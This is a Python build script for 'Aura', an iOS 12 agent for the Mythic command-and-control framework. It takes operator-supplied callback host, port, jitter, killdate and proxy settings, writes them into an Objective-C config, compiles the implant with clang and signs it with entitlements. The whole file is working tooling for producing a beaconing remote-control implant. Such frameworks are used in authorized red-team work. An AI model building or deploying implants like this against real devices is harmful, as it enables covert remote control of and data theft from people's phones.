from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import os
import subprocess
import pathlib


class Aura(PayloadType):
    name = "Aura"
    file_extension = ""
    author = "@brandon7CC"
    supported_os = [SupportedOS.IOS]
    wrapper = False
    wrapped_payloads = []
    note = """Objective-C payload supporting iOS 12."""
    supports_dynamic_loading = False
    c2_profiles = ["http"]
    mythic_encrypts = True
    translation_container = None
    build_parameters = []
    agent_path = pathlib.Path(".") / "aura"
    agent_icon_path = agent_path / "agent_functions" / "Microsoft_logo.svg"
    agent_code_path = agent_path / "agent_code"
    build_path = agent_path / "build"
    aura_payload_path = build_path / "aura_payload"

    build_steps = [
        BuildStep(step_name="Validating Build Settings", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Configuring C2", step_description="Stamping in configuration values"),
        BuildStep(step_name="Compiling and Linking Objective-C", step_description="Compiling and linking the payload for iOS."),
        BuildStep(step_name="Signing entitlements", step_description="Signing entitlements to the payload."),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            sdk_path, clang_compiler_path, objc_flags = await self._get_build_settings()

            await self._update_build_step("Validating Build Settings", "Successfully gathered Aura sources", True)

            params = self._extract_c2_parameters()

            self._create_http_config(params)

            os.makedirs(f"{self.build_path}", exist_ok=True)

            compile_link_cmd = self._generate_compile_command(clang_compiler_path, objc_flags, sdk_path)
            await self._run_command(compile_link_cmd, "Compiling and Linking Objective-C", resp)

            codesign_command = self._generate_codesign_command()
            await self._run_command(codesign_command, "Signing entitlements", resp)

            if os.path.exists(self.aura_payload_path):
                resp.payload = open(self.aura_payload_path, "rb").read()

            resp.build_message = "Successfully built and signed Aura payload!"
            resp.status = BuildStatus.Success

        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_message = f"Exception: {str(e)}"

        return resp

    async def _get_build_settings(self):
        sdk_path = "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk"
        clang_compiler_path = "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang"
        objc_flags = "-x objective-c -fobjc-arc -std=gnu11"
        
        # Check if paths exist
        if not pathlib.Path(sdk_path).exists():
            await self._update_build_step("Validating Build Settings", f"Error: SDK path not found at {sdk_path}", False)
        
        # Check if clang compiler exists
        if not pathlib.Path(clang_compiler_path).exists():
            await self._update_build_step("Validating Build Settings", f"Error: Clang compiler not found at {clang_compiler_path}", False)
        
        return sdk_path, clang_compiler_path, objc_flags


    async def _update_build_step(self, step_name, step_stdout, step_success):
        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
            PayloadUUID=self.uuid,
            StepName=step_name,
            StepStdout=step_stdout,
            StepSuccess=step_success
        ))

    def _extract_c2_parameters(self):
        params = self.c2info[0].get_parameters_dict()
        print(f"\n\nPARAMS: {params}\n\n")
        return params

    def _create_http_config(self, params):
        callback_host = params.get("callback_host", "localhost")
        callback_port = params.get("callback_port", 80)
        callback_interval = params.get("callback_interval", 10)
        callback_jitter = params.get("callback_jitter", 23)
        killdate = params.get("killdate", "2025-09-18")
        headers = params.get("headers", {})

        config_objc_code = f"""
#import "HTTPC2Config.h"

@implementation HTTPC2Config

+ (NSString *)AESPSKEncKey {{
    return @"";
}}

+ (NSString *)AESPSKDecKey {{
    return @"";
}}

+ (NSString *)AESPSKValue {{
    return @"";
}}

+ (NSString *)callbackHost {{
    return @"{callback_host}";
}}

+ (NSInteger)callbackPort {{
    return {callback_port};
}}

+ (NSInteger)callbackInterval {{
    return {callback_interval};
}}

+ (NSInteger)callbackJitter {{
    return {callback_jitter};
}}

+ (NSString *)killdate {{
    return @"{killdate}";
}}

+ (NSDictionary *)headers {{
    return @{{
        {"".join([f'@\"{k}\": @\"{v}\", ' for k, v in headers.items()])}
    }};
}}

+ (NSString *)payloadUUID {{
    return @"{self.uuid}";
}}

+ (BOOL)encryptedExchangeCheck {{
    return {str(params.get("encrypted_exchange_check", "NO")).lower()};
}}

+ (NSString *)getURI {{
    return @"{params.get("get_uri", "index")}";
}}

+ (NSString *)postURI {{
    return @"{params.get("post_uri", "agent_message")}";
}}

+ (NSString *)proxyHost {{
    return @"{params.get("proxy_host", "")}";
}}

+ (NSString *)proxyPass {{
    return @"{params.get("proxy_pass", "")}";
}}

+ (NSString *)proxyPort {{
    return @"{params.get("proxy_port", "")}";
}}

+ (NSString *)proxyUser {{
    return @"{params.get("proxy_user", "")}";
}}

+ (NSString *)queryPathName {{
    return @"{params.get("query_path_name", "query")}";
}}

@end
"""
        with open(f"{self.agent_code_path}/c2_profiles/HTTPC2Config.m", 'w') as objc_file:
            objc_file.write(config_objc_code)

    def _generate_compile_command(self, clang_compiler_path, objc_flags, sdk_path):
        source_files = [
            "main.m",
            "C2CheckIn.m",
            "c2_profiles/HTTPC2Config.m",
            "SystemInfoHelper.m",
            "C2Task.m"
        ]

        source_file_paths = " ".join([f"{self.agent_code_path}/{src}" for src in source_files])
        return (
            f"{clang_compiler_path} {objc_flags} "
            f"-target arm64-apple-ios12.0 -v "
            f"-isysroot {sdk_path} "
            f"-I {self.agent_code_path}/c2_profiles "
            f"{source_file_paths} "
            f"-framework Foundation -framework UIKit -lobjc "
            f"-o {self.aura_payload_path} "
        )

    def _generate_codesign_command(self):
        entitlements_file = self.agent_code_path / "base_entitlements.plist"
        return f"codesign -s - --entitlements {entitlements_file} --force --timestamp=none {self.aura_payload_path}"

    async def _run_command(self, command, step_name, resp):
        print(f"\n{command}\n")
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode != 0:
            await self._update_build_step(step_name, f"Failed to {step_name}", False)
            resp.set_status(BuildStatus.Error)
            resp.build_message = f"Error during {step_name}:\n{stderr.decode()}"
            return resp
        else:
            await self._update_build_step(step_name, f"Successfully {step_name}", True)
